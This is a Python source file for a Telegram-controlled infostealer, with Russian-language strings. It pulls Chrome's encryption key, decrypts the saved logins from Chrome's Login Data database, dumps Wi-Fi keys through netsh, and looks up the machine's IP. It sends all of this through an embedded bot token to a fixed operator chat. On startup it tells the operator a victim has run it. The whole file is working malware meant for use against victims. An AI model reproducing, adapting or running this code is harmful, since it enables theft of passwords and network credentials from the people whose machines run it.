from gettext import dpgettext
import os
import subprocess
import json
import requests
import socket
from urllib import request
import win32crypt
import base64
import sqlite3
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
import telebot
from telebot import types
bot = telebot.TeleBot('6647693102:AAFGQM0Ok6fCIslJl4PQoUCj867-Hq0gD9A')
keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
button_1= types.KeyboardButton(text="Сообщить все")
keyboard.add(button_1)


def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google",
                                    "Chrome", "User Data", "Local State")

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]

    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_password = cipher.decrypt(password)[:-16].decode()

        return decrypted_password
    except Exception as e:
        print(f"Error decrypting password: {e}")
        return ""

def get_chrome_datetime(chrome_date):
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_date)

def main():
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")

    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)

    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("SELECT origin_url, action_url, username_value,"
                   "password_value, date_created, date_last_used FROM logins ORDER BY date_created")

    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]

        if username or password:
            message = f"Исходный URL-адрес: {origin_url}\n" \
                      f"URL действия: {action_url}\n" \
                      f"Имя пользователя: {username}\n" \
                      f"Пароль: {password}\n"
            if date_created != 86400000000 and date_created:
                message += f"Дата создания: {str(get_chrome_datetime(date_created))}\n"
            if date_last_used != 86400000000 and date_last_used:
                message += f"Последний визит: {str(get_chrome_datetime(date_last_used))}\n"
            message += "-" * 50
            bot.send_message(1191491975, message) 

    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass

def get_ip_info(ip='127.0.0.1'):
    try:
       resp=requests.get(url=f'http://ip-api.com/json/{ip}').json()
       message=f"IP адрес:{resp}\n"
       bot.send_message(1191491975, message)
    except requests.exceptions.RequestException as e:
       print("error")
def ma():
    g()

def g():
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
    get_ip_info(ip=ip)
def j():
    try:
        data = subprocess.check_output("netsh wlan show profiles").decode('cp866').split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "Все профили пользователей" in i]
        pass_wifi = ''

        for i in profiles:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('cp866').split('\n')

            for j in results:
                if "Содержимое ключа" in j:
                    pass_wifi += f"{i} = {j.split(':')[1][1:-1]}\n"

        message = f"Пароли: {pass_wifi}\n"
        bot.send_message(1191491975, message)

    except Exception as ex:
        print(f'Ошибка: {ex}')
message = f"Кто-то схавал:) Че делать будем?"
bot.send_message(1191491975, message)
if __name__ == "__main__":
    
    @bot.message_handler(commands=['start']) 
    def start(message):
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton("Показать все данные")
        btn2 = types.KeyboardButton("Показать часть")
        markup.add(btn1, btn2)
        bot.send_message(message.chat.id, text="Привет, мой господин Noon".format(message.from_user), reply_markup=markup)

@bot.message_handler(content_types=['text'])
def func(message):
    if(message.text == "Показать все данные"):
        bot.send_message(message.chat.id, main(),ma(),j())
    elif(message.text == "Показать часть"):
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton("Пароли")
        btn2 = types.KeyboardButton("IP")
        btn3 = types.KeyboardButton("Wi-Fi пароли")
        back = types.KeyboardButton("Домой")
        markup.add(btn1, btn2, btn3, back)
        bot.send_message(message.chat.id,"Выбери:", reply_markup=markup)
    
    elif(message.text == "Пароли"):
        bot.send_message(message.chat.id, main())

    elif message.text == "IP":
        bot.send_message(message.chat.id, ma())

    elif message.text == "Wi-Fi пароли":
        bot.send_message(message.chat.id, j())

    elif (message.text == "Домой"):
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        button1 = types.KeyboardButton("Показать все данные")
        button2 = types.KeyboardButton("Выборочно")
        markup.add(button1, button2)
        bot.send_message(message.chat.id, text="Ты дома", reply_markup=markup)

    else:
        bot.send_message(message.chat.id, text="Ты больной? Ты меня этому не учил")

bot.polling(none_stop=True)
    



